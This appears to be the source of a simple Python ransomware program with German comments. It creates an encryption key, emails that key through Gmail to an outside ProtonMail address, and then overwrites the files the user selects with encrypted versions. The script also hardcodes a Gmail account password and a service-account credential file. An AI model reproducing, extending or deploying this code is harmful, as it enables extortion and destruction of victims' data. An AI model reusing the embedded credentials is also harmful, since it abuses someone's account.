import os
import subprocess
import smtplib
import ssl
from cryptography.fernet import Fernet
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from google.oauth2 import service_account
from google.auth.transport.requests import Request
import tkinter as tk
from tkinter import filedialog
icon_path = "decrypt_ico.ico"

import sys
if getattr(sys, 'frozen', False):
    # Wenn das Skript ausgeführt wird als eine eingefrorene (ausführbare) Datei (EXE)
    # Setze das Arbeitsverzeichnis auf den Verzeichnispfad der EXE-Datei
    os.chdir(sys._MEIPASS)


script_dir = os.path.dirname(os.path.abspath(__file__))
json_file_path = os.path.join(script_dir, "pyhock-8efe0c1bdb0f.json")


def send_key(key):
    sender_email = "pyhock000@gmail.com"
    receiver_email = "pyhock@proton.me"
    subject = "Verschlüsselungsschlüssel"
    message = f"Hier ist der generierte Schlüssel: {key.decode()}"

    # Erstelle eine E-Mail-Nachricht
    email = MIMEMultipart()
    email["From"] = sender_email
    email["To"] = receiver_email
    email["Subject"] = subject
    email.attach(MIMEText(message, "plain"))

    # Bestimme den Pfad zur JSON-Datei relativ zum Skript
    script_dir = os.path.dirname(os.path.abspath(__file__))
    credentials_file = os.path.join(script_dir, "pyhock-8efe0c1bdb0f.json")

    # Verbinde dich mit dem SMTP-Server von Gmail mit OAuth 2.0-Authentifizierung
    credentials = service_account.Credentials.from_service_account_file(credentials_file, scopes=["https://www.googleapis.com/auth/gmail.send"])
    credentials = credentials.with_subject(sender_email)
    if credentials.expired:
        credentials.refresh(Request())

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls(context=ssl.create_default_context())
        password = "etzjacsrytqlsfmo"  # Hier das Gmail-Passwort des sendenden Kontos angeben
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, email.as_string())

def generate_key():
    key = Fernet.generate_key()
    return key

def encrypt_file(file_path, cipher_suite):
    try:
        with open(file_path, 'r+b') as file:
            encrypted_data = cipher_suite.encrypt(file.read())
            file.seek(0)
            file.write(encrypted_data)
    except:
        print(f"Fehler beim Verschlüsseln der Datei: {file_path}")

def encrypt_files(key):
    cipher_suite = Fernet(key)

    root = tk.Tk()
    root.withdraw()

    file_paths = filedialog.askopenfilenames()
    for file_path in file_paths:
        encrypt_file(file_path, cipher_suite)

if __name__ == "__main__":
    key = generate_key()
    send_key(key)
    encrypt_files(key)
    print(key)
